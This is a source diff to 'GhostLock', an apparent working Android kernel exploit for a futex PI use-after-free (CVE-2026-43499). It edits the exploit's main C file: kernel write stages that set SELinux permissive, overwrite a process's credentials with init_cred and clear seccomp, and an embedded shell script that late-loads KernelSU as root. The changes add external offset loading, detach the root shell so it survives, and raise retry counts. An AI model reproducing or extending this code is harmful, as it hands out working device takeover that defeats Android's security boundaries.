@@ -2,11 +2,12 @@
  * GhostLock — CVE-2026-43499 futex PI UAF exploit
  *
  * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
- * ksud late-load.
+ * independent root shell: ksud late-load + module watch.
  */
 
 #include "common.h"
 #include "offsets.h"
+#include <ctype.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <linux/perf_event.h>
@@ -14,9 +15,11 @@
 #include <sys/system_properties.h>
 #include <sys/utsname.h>
 #include <strings.h>
-#include <poll.h>
 
 const struct kernel_offsets *active_offsets = NULL;
+
+static char g_home_dir[256] = "/data/local/tmp";
+static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
 
 /* MTK loads the kernel at the DRAM base (text_offset=0), Qualcomm via the
  * bootloader; the same uname -r can serve both families, so detect at
@@ -56,20 +59,6 @@ static int soc_is_mtk(void) {
 #undef ROOT_TASK_GROUP_OFF
 #undef SELINUX_BLOB_SIZES_OFF
 #undef SECURITY_HOOK_HEADS_OFF
-#undef KMALLOC_CACHES_OFF
-#undef ANON_PIPE_BUF_OPS_OFF
-#undef ASHMEM_MISC_FOPS_OFF
-#undef ASHMEM_FOPS_OFF
-#undef ASHMEM_IOCTL_OFF
-#undef ASHMEM_COMPAT_IOCTL_OFF
-#undef ASHMEM_MMAP_OFF
-#undef ASHMEM_OPEN_OFF
-#undef ASHMEM_RELEASE_OFF
-#undef ASHMEM_SHOW_FDINFO_OFF
-#undef CONFIGFS_READ_ITER_OFF
-#undef CONFIGFS_BIN_WRITE_ITER_OFF
-#undef COPY_SPLICE_READ_OFF
-#undef NOOP_LLSEEK_OFF
 #undef SLIDE_NFULNL_LOGGER_OFF
 #undef SLIDE_LOGGERS_0_1_OFF
 #undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
@@ -81,20 +70,6 @@ static int soc_is_mtk(void) {
 #define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
 #define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
 #define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
-#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
-#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
-#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
-#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
-#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
-#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
-#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
-#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
-#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
-#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
-#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
-#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
-#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
-#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
 #define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
 #define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
@@ -102,7 +77,60 @@ static int soc_is_mtk(void) {
 
 /* Override struct field offsets (task_struct, etc.) with per-device values */
 #include "runtime_struct_offsets.h"
+#include "offsets_json.h"
 
+static struct kernel_offsets g_external_offsets;
+static char g_external_release[192];
+
+/* Publish the active entry's init_cred image address and the physical load
+ * address (MTK always loads at the DRAM base, text_offset=0). */
+static void publish_active_offsets(void) {
+  g_init_cred_image = INIT_CRED;
+  if (active_offsets->kernel_phys_load) {
+    p0_kernel_phys_load = active_offsets->kernel_phys_load;
+  }
+  int mtk = soc_is_mtk();
+  if (mtk) {
+    p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
+  }
+  pr_info("soc: %s; kernel_phys_load=0x%llx\n",
+          mtk ? "mtk" : "qcom/other",
+          (unsigned long long)p0_kernel_phys_load);
+  pr_info("init_cred image=%016zx alias=%016zx\n",
+          (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
+}
+
+/* Import a matching entry from <home>/offsets.json; returns 0 and activates
+ * the external table on success.  When the release is also registered in the
+ * built-in table, the entry starts from the built-in values so fields the
+ * JSON leaves empty keep the built-in ones instead of falling back to
+ * target.h defaults. */
+static int try_external_offsets(const char *release) {
+  char path[320];
+  snprintf(path, sizeof(path), "%s/offsets.json", g_home_dir);
+  const struct kernel_offsets *builtin = NULL;
+  for (int i = 0; known_offsets[i].uname_r; i++) {
+    if (strcmp(release, known_offsets[i].uname_r) == 0) {
+      builtin = &known_offsets[i];
+      break;
+    }
+  }
+  if (builtin) {
+    g_external_offsets = *builtin;
+  } else {
+    memset(&g_external_offsets, 0, sizeof(g_external_offsets));
+  }
+  int rc = load_offsets_json(path, release, &g_external_offsets,
+                             g_external_release, sizeof(g_external_release));
+  if (rc == 0) {
+    active_offsets = &g_external_offsets;
+    pr_success("offsets imported from offsets.json: %s\n",
+               active_offsets->uname_r);
+  } else {
+    pr_info("no external offsets match at %s\n", path);
+  }
+  return rc;
+}
 static int select_offsets(void) {
   struct utsname uts;
   if (uname(&uts) < 0) return -1;
@@ -114,31 +142,24 @@ static int select_offsets(void) {
     return -1;
   }
 #endif
+  /* Imported offsets win over the built-in tables so refreshed values take
+   * effect without rebuilding the app. */
+  if (try_external_offsets(uts.release) == 0) {
+    publish_active_offsets();
+    return 0;
+  }
   for (int i = 0; known_offsets[i].uname_r; i++) {
     if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
       active_offsets = &known_offsets[i];
       pr_success("offsets matched: %s\n", active_offsets->uname_r);
-      /* Publish the selected entry's init_cred image address. */
-      g_init_cred_image = INIT_CRED;
-      /* STRUCT_OFFSETS_6_6/6_12 carry the version-selected Qualcomm default;
-       * MTK always loads at the DRAM base (text_offset=0). */
-      if (active_offsets->kernel_phys_load) {
-        p0_kernel_phys_load = active_offsets->kernel_phys_load;
-      }
-      int mtk = soc_is_mtk();
-      if (mtk) {
-        p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
-      }
-      pr_info("soc: %s; kernel_phys_load=0x%llx\n",
-              mtk ? "mtk" : "qcom/other",
-              (unsigned long long)p0_kernel_phys_load);
-      pr_info("init_cred image=%016zx alias=%016zx\n",
-              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
+      publish_active_offsets();
       return 0;
     }
   }
   pr_error("no offsets for kernel: %s\n", uts.release);
-  pr_error("add this kernel to offsets.h and rebuild\n");
+  pr_error("add this kernel to offsets.h and rebuild, or import a matching "
+           "offsets.json entry into %s\n",
+           g_home_dir);
   return -1;
 }
 
@@ -154,7 +175,7 @@ static double timer_ms(void) {
 extern int pselect_custom_write;
 extern uintptr_t pselect_custom_target;
 extern int pselect_child_node;
-void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
+void set_pselect_write_mode(uintptr_t target, int mode);
 void clear_pselect_write(void);
 
 uint32_t f_wait;
@@ -173,8 +194,6 @@ atomic_int consumer_calls;
 atomic_int consumer_success;
 atomic_int consumer_inflight;
 atomic_int main_route_delay_usec;
-atomic_int pipe_prepare_request;
-atomic_int pipe_prepare_done;
 int memfd_leak;
 
 void *waiter_thread(void *arg __attribute__((unused))) {
@@ -267,8 +286,7 @@ void reset_main_route_state(void) {
   atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
   atomic_store(&consumer_inflight, 0);
   atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
-  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
-  cfi_last_step = 0; cfi_last_errno = 0;
+  route_last_step = 0; route_last_errno = 0;
 }
 
 int run_main_route_threads(void) {
@@ -292,7 +310,7 @@ int run_main_route_threads(void) {
   pthread_join(consumer, NULL);
 
   return atomic_load(&consumer_calls) > 0 &&
-         atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
+         atomic_load(&consumer_success) > 0 && route_last_step == 0;
 }
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
@@ -302,9 +320,9 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
    * with the erased node's rb_right value: fake_left is always NULL so case 1
    * always fires, and the erased node is RED so no color fixup runs. */
   pselect_child_node = leaf ? 0 : 1;
-  set_pselect_write_mode(target, 0, mode);
+  set_pselect_write_mode(target, mode);
   TIMER("  heap spray start");
-  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  page_base = prepare_good_kernel_page();
   if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
   TIMER("  heap spray done");
   int routed = run_main_route_threads();
@@ -382,9 +400,6 @@ static void slab_drain(void) {
     usleep(20000);
   }
 }
-
-static char g_home_dir[256] = "/data/local/tmp";
-static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
 
 int g_core_main = 0;
 int g_core_consumer = 1;
@@ -482,12 +497,16 @@ static void write_root_script(void) {
       "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
       "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
       "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
-      "if [ ! -x \"$KSUD\" ]; then\n"
-      "  echo '[!] ksud missing' | tee -a \"$LOG\"\n"
+      "if [ \"$(id -u)\" -ne 0 ]; then\n"
+      "  echo '[!] temp su unavailable; aborting' | tee -a \"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
-      "chmod 755 \"$KSUD\" 2>/dev/null\n"
       "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+      "  if [ ! -x \"$KSUD\" ]; then\n"
+      "    echo '[!] ksud missing; cannot late-load' | tee -a \"$LOG\"\n"
+      "    exit 1\n"
+      "  fi\n"
+      "  chmod 755 \"$KSUD\" 2>/dev/null\n"
       "  KVER=$(uname -r | cut -d. -f1-2)\n"
       "  AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
       "  KMI=\"${AVER}-${KVER}\"\n"
@@ -496,6 +515,7 @@ static void write_root_script(void) {
       "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
       "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
       "fi\n"
+      "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
       "KSU_READY=0\n"
       "for i in $(seq 1 50); do\n"
       "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
@@ -506,14 +526,26 @@ static void write_root_script(void) {
       "  exit 1\n"
       "fi\n"
       "echo '[+] KernelSU module loaded' | tee -a \"$LOG\"\n"
+      "echo \"[*] kernelsu.ko loaded; root pid=$$ uid=$(id -u)\" >>\"$LOG\"\n"
       "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
-      "POLICY=/sys/fs/selinux/policy\n"
-      "for i in $(seq 1 50); do [ -s \"$POLICY\" ] && break; sleep 0.1; done\n"
-      "load_policy \"$POLICY\" >>\"$LOG\" 2>&1\n"
-      "RC=$?\n"
-      "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
-      "echo \"[*] policy fixup rc=$RC\" >>\"$LOG\"\n"
-      "echo '[!] Reconnect Wi-Fi or mobile data if network is unavailable' | tee -a \"$LOG\"\n",
+      "echo \"[*] setenforce 0 rc=$?\" >>\"$LOG\"\n"
+      "FIXUP_RC=1\n"
+      "for i in $(seq 1 10); do\n"
+      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
+      "  timeout 8 load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1\n"
+      "  FIXUP_RC=$?\n"
+      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "    break\n"
+      "  fi\n"
+      "  sleep 2\n"
+      "done\n"
+      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
+      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "  echo \"[*] restoring enforcing\" >>\"$LOG\"\n"
+      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "else\n"
+      "  echo '[!] fixup failed; SELinux left permissive' | tee -a \"$LOG\"\n"
+      "fi\n",
       g_home_dir);
   if (n < 0 || n >= (int)sizeof(script)) {
     pr_warning("root script too long\n");
@@ -616,10 +648,9 @@ struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
-  setpgid(0, 0);  /* own group so the parent can kill the whole late-load
-                   * tree (sh + ksud) on timeout */
-  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* ksud-spawned daemons must not
-                                          * inherit the report pipe */
+  setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
+  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
+                                          * root shell / ksud chain */
   prctl(PR_SET_NAME, "ghostleaf_0123456789");
   uintptr_t my_task = perf_find_task();
   write(p->task_w, &my_task, sizeof(my_task));
@@ -684,36 +715,24 @@ static void child_main(struct child_pipes *p) {
   }
   close(p->cmd_r);
   if (getuid() != 0) { close(p->uid_w); _exit(1); }
-  /* Keep the app-side pipe/exit fds out of the late-load worker chain: a
-   * lingering holder (ksud/zygisk daemons) would keep the app's read and
-   * waitFor blocked after this process exits. */
+  /* Don't leak app-side fds into the root shell chain: ksud/zygisk
+   * daemons must not keep their write ends open. */
   for (int fd = 3; fd < 1024; fd++) {
     int fl = fcntl(fd, F_GETFD);
     if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
   }
   pid_t worker = fork();
   if (worker == 0) {
+    /* Detach into a brand-new session: the independent root shell owns the
+     * whole chain (ksud late-load + module watch) and must survive the
+     * exploit parent killing this group on timeout. */
+    if (setsid() < 0) _exit(1);
     execl("/system/bin/sh", "sh", g_root_script_path, NULL);
     _exit(1);
   }
-  int wst = -1;
-  if (worker > 0) waitpid(worker, &wst, 0);
-  /* Report whether the script reached the loaded-module line: only this root
-   * child can read the root-owned log, and the parent loses /proc/modules
-   * once enforcing is restored. */
-  uint32_t report = 0;
-  char ksu_log_path[320];
-  snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
-  FILE *lf = fopen(ksu_log_path, "r");
-  if (lf) {
-    char line[256];
-    while (fgets(line, sizeof(line), lf)) {
-      if (strstr(line, "[+] KernelSU module loaded")) report = 1;
-    }
-    fclose(lf);
-  }
-  ssize_t nw = write(p->uid_w, &report, sizeof(report));
-  (void)nw;
+  if (worker < 0) { close(p->uid_w); _exit(1); }
+  /* Do not wait: the root shell runs to completion on its own; the parent
+   * polls the app-readable log. */
   close(p->uid_w);
   _exit(0);
 }
@@ -849,13 +868,8 @@ int run_exploit(int argc, char **argv) {
 
   log_startup_context();
   init_p0_profile();
-  init_ashmem_path();
   pin_to_core(CORE);
   pr_info("main thread running on cpu=%d\n", sched_getcpu());
-
-  kaslr_slide = 0;
-  kaslr_base = KIMAGE_TEXT_BASE;
-  kaslr_done = 1;
 
   timer_reset();
   TIMER("exploit start");
@@ -869,7 +883,7 @@ int run_exploit(int argc, char **argv) {
     }
     TIMER("pre-W1 drain");
     selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 8, 100000,
+        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
         verify_selinux_stage, NULL, 0);
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
@@ -938,17 +952,17 @@ int run_exploit(int argc, char **argv) {
     pselect_child_node = 1;
 
     int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
+        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 50000,
         verify_w2_stage, &w2_context, 0);
     if (!got_root) {
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
-      pr_warning("W2 failed after 10 rounds\n");
+      pr_warning("W2 failed after 15 rounds\n");
       waitpid(child, NULL, 0);
       return 1;
     }
 
-    /* W3: clear the child's seccomp filter for the late-load worker
+    /* W3: clear the child's seccomp filter for the independent root shell
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
      * must be zeroed too; do both writes back-to-back with one probe
      * (real finit_module calls trip vendor root guards).
@@ -1023,21 +1037,20 @@ int run_exploit(int argc, char **argv) {
   TIMER("exploit complete");
   if (child_alive) {
     if (write(pipes.cmd_w, "G", 1) != 1)
-      pr_warning("failed to start late-load worker (child exited early)\n");
+      pr_warning("failed to start root shell (child exited early)\n");
   } else {
     pr_warning("skipping late-load: child died during W3\n");
   }
   close(pipes.cmd_w);
-  uint32_t child_report = 0;
   if (child_alive) {
-    /* Bound the late-load handoff: if the worker hangs (e.g. a kernel lock
-     * inside a script step), kill the whole tree so the app flow finishes. */
+    /* The child only forks the independent root shell and exits fast; keep
+     * a bounded wait in case it got stuck before the fork. */
     int waited_ms = 0;
     for (;;) {
       pid_t r = waitpid(child, NULL, WNOHANG);
       if (r == child || r < 0) break;
       if (waited_ms >= 45000) {
-        pr_warning("late-load worker timed out; killing child\n");
+        pr_warning("child stuck before root shell handoff; killing group\n");
         kill(-child, SIGKILL);
         waitpid(child, NULL, 0);
         break;
@@ -1045,12 +1058,6 @@ int run_exploit(int argc, char **argv) {
       usleep(100000);
       waited_ms += 100;
     }
-    struct pollfd pfd = { .fd = pipes.uid_r, .events = POLLIN };
-    ssize_t nr = -1;
-    if (poll(&pfd, 1, 10000) > 0 && (pfd.revents & POLLIN)) {
-      nr = read(pipes.uid_r, &child_report, sizeof(child_report));
-    }
-    if (nr != (ssize_t)sizeof(child_report)) child_report = 0;
   }
   close(pipes.uid_r);
 
@@ -1058,10 +1065,11 @@ int run_exploit(int argc, char **argv) {
   for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
     usleep(100000);
   }
-  /* The poll can miss a module once enforcing is restored (untrusted_app
-   * loses /proc/modules); use the child's report, falling back to the log. */
-  int ksu_log_loaded = (child_report & 1u) != 0;
-  for (int i = 0; i < 30 && !ksu_log_loaded; i++) {
+  /* untrusted_app loses /proc/modules once enforcing is restored, so poll
+   * the app-readable log for the loaded-module line (up to ~30s). */
+  int ksu_log_loaded = 0;
+  int ksu_log_failed = 0;
+  for (int i = 0; i < 60 && !(ksu_log_loaded || ksu_log_failed); i++) {
     char ksu_log_path[320];
     snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
     FILE *lf = fopen(ksu_log_path, "r");
@@ -1069,19 +1077,23 @@ int run_exploit(int argc, char **argv) {
       char line[256];
       while (fgets(line, sizeof(line), lf)) {
         if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
+        if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
       }
       fclose(lf);
     }
-    if (!ksu_log_loaded) usleep(200000);
+    if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
   }
   kernelsu_ready = kernelsu_ready || ksu_log_loaded;
 
-  /* ksud restores enforcing itself once the module is up, so a loaded module
-   * is the success signal. */
+  /* The detached root shell runs the fixup: permissive, load_policy, then
+   * enforcing. The permissive window restores network; the policy reload
+   * is what keeps it working after enforcing is restored. */
   if (kernelsu_ready)
-    pr_success("KernelSU ready; SELinux enforcing restored\n");
+    pr_success("KernelSU ready; policy fixup result in .ghostlock_ksu.log\n");
+  else if (ksu_log_failed)
+    pr_warning("KernelSU module load failed (see .ghostlock_ksu.log)\n");
   else if (seccomp_ok)
-    pr_warning("temporary root ready; KernelSU module not loaded (ksud late-load failed; see .ghostlock_ksu.log)\n");
+    pr_warning("temporary root ready; KernelSU module load pending (independent root shell; see .ghostlock_ksu.log)\n");
   else
     pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
   return 0;
